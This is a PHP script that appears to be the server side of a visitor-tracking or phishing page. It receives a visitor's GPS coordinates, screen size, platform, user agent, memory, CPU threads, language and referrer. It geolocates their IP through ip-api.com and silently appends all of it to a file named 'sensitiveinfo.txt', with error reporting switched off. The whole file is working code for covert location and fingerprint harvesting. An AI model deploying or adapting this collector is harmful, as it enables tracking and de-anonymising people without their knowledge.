<?php
 
/*
* Write your logic to manage the data
* like storing data in database
*/
error_reporting(0);
$width = $_POST['width'];
$height = $_POST['height'];
$platform = $_POST['platform'];
$gps = $_POST['gps'];
$localtime = $_POST['localtime'];
$devicelang = $_POST['devicelang'];
$iscookieEnabled = $_POST['iscookieEnabled'];
$useragent = $_POST['useragent'];
$deviceram = $_POST['deviceram'];
$cpuThreads = $_POST['cpuThreads'];
$referurl = $_POST['referurl'];
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;
date_default_timezone_set('Europe/Istanbul');
$tarih=date("d-m-Y H:i:s");
$file = fopen('sensitiveinfo.txt', 'a');
fwrite($file, "Ip Address: " .$ip."\n\n".
"Country: ".$ulke ."\n\n"."ScreenWidth: ".$width."\n\n" ."ScreeHeight: ".$height."\n\n" ."Platform: ".$platform."\n\n" ."GPS: ".$gps."\n\n" ."DeviceLocalTime: ".$localtime."\n\n" ."DeviceLanguage: ".$devicelang."\n\n" ."CookieEnabled: ".$iscookieEnabled."\n\n" ."UserAgent: ".$useragent."\n\n" ."DeviceMemory: ".$deviceram."\n\n" ."CPuThreads: ".$cpuThreads."\n\n" ."ReferUrl: ".$referurl."\n\n\n\n");
fclose($file);


 
?>